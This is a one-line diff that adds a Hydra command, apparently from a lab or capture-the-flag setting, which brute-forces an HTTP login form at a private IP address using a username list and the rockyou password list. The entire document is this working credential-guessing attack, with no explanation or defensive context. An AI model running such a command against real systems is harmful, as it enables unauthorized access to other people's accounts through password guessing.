@@ -1,0 +1,1 @@
+hydra -L usernames.txt -P rockyou.txt 10.10.48.81 http-post-form "login.php:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid" -V
